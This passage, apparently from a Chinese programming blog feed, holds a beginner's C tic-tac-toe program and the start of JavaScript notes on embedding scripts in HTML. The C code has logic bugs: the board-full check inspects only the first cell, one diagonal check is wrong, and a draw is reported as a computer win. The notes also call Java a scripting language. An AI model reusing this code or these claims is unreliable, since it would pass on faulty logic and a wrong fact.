        <content type="html"><![CDATA[<h1 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="comment">//符号的定义</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROW 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COL 3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="comment">//函数的声明</span></span><br><span class="line"><span class="comment">//初始化棋盘</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitBoard</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印棋盘</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">DisplayBoard</span><span class="params">(<span class="type">char</span> board[ROW][COL],<span class="type">int</span> row,<span class="type">int</span> col)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//玩家下棋</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">PlayerMove</span><span class="params">(<span class="type">char</span> board[][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//电脑下棋</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ComputerMove</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.玩家赢了-*</span></span><br><span class="line"><span class="comment">//2.电脑赢了-#</span></span><br><span class="line"><span class="comment">//3.平局-Q</span></span><br><span class="line"><span class="comment">//4.游戏继续-C</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是否赢游戏</span></span><br><span class="line"><span class="type">char</span> <span class="title function_">IsWin</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是否继续游戏</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsFull</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span>;</span><br></pre></td></tr></table></figure><h1 id="函数实现"><a href="#函数实现" class="headerlink" title="函数实现"></a>函数实现</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;game.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitBoard</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; row; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; col; j++)</span><br><span class="line">&#123;</span><br><span class="line">board[i][j] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DisplayBoard</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; row; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; col; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; %c &quot;</span>, board[i][j]);</span><br><span class="line"><span class="keyword">if</span> (j &lt; col - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (i &lt; row - <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; col; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(j &lt; col<span class="number">-1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">PlayerMove</span><span class="params">(<span class="type">char</span> board[][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;玩家走:&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入下棋的坐标:&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line"><span class="comment">//判断坐标合法性</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (x &gt;= <span class="number">1</span> &amp;&amp; x &lt;= row &amp;&amp; y &gt;= <span class="number">1</span> &amp;&amp; y &lt;= col)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//下棋</span></span><br><span class="line"><span class="comment">//判断坐标是否被占用</span></span><br><span class="line"><span class="keyword">if</span> (board[x - <span class="number">1</span>][y - <span class="number">1</span>] == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">board[x - <span class="number">1</span>][y - <span class="number">1</span>] = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;坐标被占用,请重新输入\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;坐标非法，请重新从输入\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ComputerMove</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;电脑走:&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> x = rand() % row;</span><br><span class="line"><span class="type">int</span> y = rand() % col;</span><br><span class="line"><span class="comment">//判断占用</span></span><br><span class="line"><span class="keyword">if</span> (board[x][y] == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">board[x][y] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> <span class="title function_">IsWin</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//判断三行</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; row; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (board[i][<span class="number">0</span>] == board[i][<span class="number">1</span>] &amp;&amp; board[i][<span class="number">1</span>] == board[i][<span class="number">2</span>] &amp;&amp; board[i][<span class="number">1</span>] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> board[i][<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断三列</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; col; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (board[<span class="number">0</span>][i] == board[<span class="number">1</span>][i] &amp;&amp; board[<span class="number">1</span>][i] == board[<span class="number">2</span>][i] &amp;&amp; board[<span class="number">1</span>][i] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> board[<span class="number">1</span>][i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断对角</span></span><br><span class="line"><span class="keyword">if</span> (board[<span class="number">0</span>][<span class="number">0</span>] == board[<span class="number">1</span>][<span class="number">1</span>] &amp;&amp; board[<span class="number">1</span>][<span class="number">1</span>] == board[<span class="number">2</span>][<span class="number">2</span>] &amp;&amp; board[<span class="number">0</span>][<span class="number">0</span>] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> board[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (board[<span class="number">0</span>][<span class="number">2</span>] == board[<span class="number">1</span>][<span class="number">1</span>] &amp;&amp; board[<span class="number">1</span>][<span class="number">1</span>] == board[<span class="number">2</span>][<span class="number">0</span>] &amp;&amp; board[<span class="number">0</span>][<span class="number">0</span>] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> board[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断平局</span></span><br><span class="line"><span class="comment">//如果满返回1.不满返回0</span></span><br><span class="line"><span class="type">int</span> ret = IsFull(board,row,col);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;Q&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//继续</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">IsFull</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; row; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; col; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (board[i][j] == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="界面实现"><a href="#界面实现" class="headerlink" title="界面实现"></a>界面实现</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;game.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;********************************\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*******     1.play     *********\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*******     0.exit     *********\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;********************************\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">game</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//存储数据-二维数组（棋盘）</span></span><br><span class="line"><span class="type">char</span> board[ROW][COL];</span><br><span class="line"><span class="comment">//初始化棋盘-初始化空格</span></span><br><span class="line">InitBoard(board, ROW, COL);</span><br><span class="line"><span class="comment">//打印棋盘</span></span><br><span class="line">DisplayBoard(board,ROW,COL);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> ret = IsWin(board, ROW, COL);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//玩家下棋</span></span><br><span class="line">PlayerMove(board, ROW, COL);</span><br><span class="line">DisplayBoard( board, ROW, COL);</span><br><span class="line">ret = IsWin(board, ROW, COL);</span><br><span class="line"><span class="keyword">if</span> (ret != <span class="string">&#x27;C&#x27;</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">//电脑下棋</span></span><br><span class="line">ComputerMove(board, ROW, COL);</span><br><span class="line">DisplayBoard(board, ROW, COL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;玩家赢\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ret == <span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;电脑赢\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;电脑赢了\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">DisplayBoard(board, ROW, COL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> input = <span class="number">0</span>;</span><br><span class="line">srand((<span class="type">unsigned</span> <span class="type">int</span>)time(<span class="literal">NULL</span>));</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">menu();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请选择:&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line"><span class="keyword">switch</span> (input)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">game();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;三子棋游戏\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;退出游戏\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;选择错误，重新选择\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (input);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript学习笔记</title>
      <link href="/2023/03/09/JavaScript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/03/09/JavaScript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript概述"><a href="#JavaScript概述" class="headerlink" title="JavaScript概述"></a>JavaScript概述</h1><ol><li>简称js</li><li>一种脚本语言，脚本语言的特点<br> java语言是一种脚本语言<br> JavaScript的目标程序是以普通文本的形式保存，用记事本可以直接打开的</li><li>JavaScript和JScript的关系</li><li>JavaScript主要用来操作HTML中的节点，产生动态效果</li><li>JavaScript和Java的区别<br> JavaScript运行在浏览器中，浏览器中有JS代码的内核<br> Java运行在JVM中，JavaScript和JAVA没有任何关系<br> Java语言是SUN公司开发的，JavaScript这个名字是SUN公司给起的名<br> JavaScript是一门编程语言，专门用来操作HTML页面中的节点，让王爷产生动态效果的，JavaScript中也有变量，数据类型等</li></ol><h1 id="JavaScript-包括三块：ECMAScript、DOM、BOM"><a href="#JavaScript-包括三块：ECMAScript、DOM、BOM" class="headerlink" title="JavaScript 包括三块：ECMAScript、DOM、BOM"></a>JavaScript 包括三块：ECMAScript、DOM、BOM</h1><ol><li>ECMAScript是ECMA制定的262标准，JavaScript和Jscript都遵守这个标准，ECMAScript是JavaScript核心语法</li><li>DOM编程时通过JavaScript对HTML中的dom节点进行操作，DOM时有规范的，DOM规范时W3C制定的。</li><li>BOM编程是对浏览器本身操作，例如：前进、后退、地址栏、关闭窗口、弹窗等。由于浏览器由不同的厂家制造，所以BOM缺少规范，一般只是有一个默认的行业规范。（Brower Object Model，浏览器对象类型）</li></ol><h1 id="JavaScript-嵌入JS三种方式以及JS的注释"><a href="#JavaScript-嵌入JS三种方式以及JS的注释" class="headerlink" title="JavaScript 嵌入JS三种方式以及JS的注释"></a>JavaScript 嵌入JS三种方式以及JS的注释</h1><h2 id="3-1-行间事件"><a href="#3-1-行间事件" class="headerlink" title="3.1 行间事件"></a>3.1 行间事件</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>在HTML中嵌入JS代码的第一种方式：行间事件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1、需求：用户点击以下这个按钮，弹出一个对话框，对话框上显示：hello world</span></span><br><span class="line"><span class="comment">2、JavaScript是一种事件驱动型的编程语言，通常都是在发生某个事件的时候，去执行</span></span><br><span class="line"><span class="comment">某段代码。其中事件包括很多，例如：鼠标单击事件click，另外还有其它事件，例如：</span></span><br><span class="line"><span class="comment">mouseover是鼠标经过事件等。并且在JavaScript当中任何一个事件都有对应的事件句柄。</span></span><br><span class="line"><span class="comment">例如：click对应的事件句柄是onclick，mouseover对应的事件句柄是onmouseover。</span></span><br><span class="line"><span class="comment">3、所有的事件句柄都是以标签的属性形式存在。例如以下input button就有一个onclick这样属性。</span></span><br><span class="line"><span class="comment">只要有用户点击了以下的这个按钮对象，此时按钮对象上发生了鼠标单击事件，那么注册在</span></span><br><span class="line"><span class="comment">onclick事件句柄当中的JS代码会被执行！onclick后面代码实际上是浏览器负责执行的。</span></span><br><span class="line"><span class="comment">4、onclick=&quot;后面的代码&quot;并不是在浏览器打开的时候执行，浏览器打开的时候，只是将这个代码</span></span><br><span class="line"><span class="comment">注册给onclick事件句柄了。等待该按钮的click事件发生，只要发生，后面代码会被事件监听器</span></span><br><span class="line"><span class="comment">调用。</span></span><br><span class="line"><span class="comment">5、怎么使用JS代码弹窗？</span></span><br><span class="line"><span class="comment">在JS当中有一个内置的BOM对象，可以直接拿来使用，全部小写：window</span></span><br><span class="line"><span class="comment">其中window对象有一个方法/函数叫做alert，这个函数专门用来弹出对话框！</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">6、window.alert(&#x27;hello world!&#x27;); 弹窗的JS代码。</span></span><br><span class="line"><span class="comment">通过这个代码可以知道：JS中的字符串可以使用单引号括起来，也可以使用双引号。</span></span><br><span class="line"><span class="comment">JS中的一条语句可以“;”结尾，也可以不以“;”结尾。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hello1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;window.alert(&#x27;hello world!&#x27;);&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hello2&quot;</span> <span class="attr">onclick</span>=<span class="string">&#x27;window.alert(&quot;hello world!&quot;)</span></span></span><br><span class="line"><span class="string"><span class="tag"> window.alert(&quot;hello kitty&quot;)</span></span></span><br><span class="line"><span class="string"><span class="tag"> window.alert(&quot;你好,中国!&quot;)&#x27;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- window. 可以省略 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hello3&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;hello world!&#x27;);&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="出了点问题：在用sublime-text编辑时，好像格式有要求，他会有引号不匹配，但换成HBuilder又行了，不懂怎么回事。"><a href="#出了点问题：在用sublime-text编辑时，好像格式有要求，他会有引号不匹配，但换成HBuilder又行了，不懂怎么回事。" class="headerlink" title="出了点问题：在用sublime text编辑时，好像格式有要求，他会有引号不匹配，但换成HBuilder又行了，不懂怎么回事。"></a>出了点问题：在用sublime text编辑时，好像格式有要求，他会有引号不匹配，但换成HBuilder又行了，不懂怎么回事。</h3><h2 id="3-2-脚本块方式"><a href="#3-2-脚本块方式" class="headerlink" title="3.2 脚本块方式"></a>3.2 脚本块方式</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 脚本块的位置随意，没有限制！ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;page begin&quot;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>在HTML中嵌入JS代码的第二种方式：脚本块的方式<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 这个按钮会先被加载到浏览器内存。 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;按钮1&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 脚本块 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 一个页面中脚本块可以出现多个！ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">/* 在这里直接编写JS代码，这些JS代码在页面打开的时候自上而下的顺序依次逐行执行！ */</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//alert(&quot;hello world&quot;); // 单行注释</span></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;hello zhangsan&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;hello lisi&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">多行注释</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">*/</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 最后加载这个按钮2 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;按钮2&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;page end!&quot;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3-3-引入外部独立的JS文件"><a href="#3-3-引入外部独立的JS文件" class="headerlink" title="3.3 引入外部独立的JS文件"></a>3.3 引入外部独立的JS文件</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>在HTML中嵌入JS的第三种方式：引入外部独立的JS文件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 引入外部独立的CSS文件。这个标签link中属性是href --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 引入外部独立的js文件 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- script标签引入js文件的时候，是src属性，不是href。 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 引入第二次，这个操作没有意义，测试结果：只要引入一次JS文件，JS文件中的代码就会全部执行一遍 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/1.js&quot;</span>&gt;</span><span 